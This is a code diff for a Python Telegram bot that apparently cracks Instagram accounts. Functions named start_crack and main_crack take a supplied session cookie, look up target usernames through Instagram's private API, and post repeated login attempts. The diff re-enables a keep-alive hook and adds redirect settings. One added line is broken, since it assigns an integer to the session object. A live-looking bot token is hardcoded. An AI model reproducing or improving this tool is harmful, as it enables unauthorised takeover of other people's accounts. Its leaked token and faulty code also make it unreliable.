@@ -7,9 +7,9 @@ import random
 from telebot.types import InlineKeyboardButton, ForceReply, InlineKeyboardMarkup, CallbackQuery
 from urllib.parse import unquote
 from threading import Thread
-#from keep_alive import keep_alive
+from keep_alive import keep_alive
 
-#keep_alive()
+keep_alive()
 bot = telebot.TeleBot('6777370057:AAFH6G5iqiaBloief_xk356wz3T7uPK7R4g')
 
 user_states = {}
@@ -117,7 +117,7 @@ def start_crack(message):
   }
   
   
-  session = requests.Session()
+  session = requests.Session().max_redirects=100
   response = session.get(url, cookies=clean_cookie, headers=headers)
   #bot.send_message(chat_id, response.text)
   if response.status_code == 200:
@@ -173,7 +173,7 @@ def get_target(message):
     }
     
     url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={target_username}"
-    response = requests.get(url, headers=headers, cookies=clean_cookie)
+    response = requests.get(url, headers=headers, cookies=clean_cookie, allow_redirects=False)
     if response.status_code == 200:
         user_info = response.json()
         target.append(user_info['data']['user']['id'])
@@ -263,7 +263,7 @@ def main_crack(chat_id, message_id):
         usr_name = username.strip()  # Menghilangkan newline
         
         url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={usr_name}"
-        response = requests.get(url, headers=headers)
+        response = requests.get(url, headers=headers, allow_redirects=False)
         time.sleep(1)
         
         if response.status_code == 200:
@@ -286,7 +286,7 @@ def main_crack(chat_id, message_id):
                 'login_attempt_count': '0',
             }
             
-            response_log = requests.post(login_url, headers=headers, data=data)
+            response_log = requests.post(login_url, headers=headers, data=data, allow_redirects=False)
             time.sleep(1)
             
             
